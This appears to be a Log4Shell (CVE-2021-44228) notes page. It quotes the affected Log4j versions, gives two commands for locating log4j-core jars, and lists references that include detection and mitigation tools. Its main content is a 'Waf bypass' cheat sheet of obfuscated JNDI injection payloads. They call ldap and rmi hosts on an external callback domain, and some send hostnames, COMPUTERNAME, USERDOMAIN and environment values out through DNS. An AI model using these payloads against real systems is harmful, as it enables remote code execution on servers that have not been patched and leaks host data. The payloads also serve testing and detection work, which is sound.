## CVE-2021-44228

> Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

> From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

### Waf bypass
```

${jndi:ldap://127.0.0.1:1389/ badClassName} 
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${::-j}ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${lower:jndi}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${lower:${lower:jndi}}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${upper:jndi}:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
```
### 查找
```
find . -name *.jar|grep log4j-core
mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
```


### Ref
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml
- https://gist.github.com/ZephrFish/32249cae56693c1e5484888267d07d39
- https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
- https://github.com/jas502n/Log4j2-CVE-2021-44228
- http://slf4j.org/log4shell.html
- https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql
- [Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout)
- [Security Advisories / Bulletins linked to Log4Shell (CVE-2021-44228)](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)
- https://github.com/jfrog/log4j-tools
- [log4j-jndi-be-gone: A simple mitigation for CVE-2021-44228](https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/)
- [Detection rules to look for Log4J usage and exploitation](https://github.com/timb-machine/log4j)
- https://github.com/back2root/log4shell-rex
- [Log4j影响列表](https://github.com/cisagov/log4j-affected-db)
- [一个针对防御 log4j2 CVE-2021-44228 漏洞的 RASP 工具](https://github.com/boundaryx/cloudrasp-log4j2)
- [浅谈 Log4j2 漏洞](https://tttang.com/archive/1378/)
- [代码级分析Log4j2漏洞和对Elasticsearch的影响](https://www.bilibili.com/video/BV1Ua411r7zN)
- https://github.com/cisagov/log4j-affected-db/tree/develop/software_lists
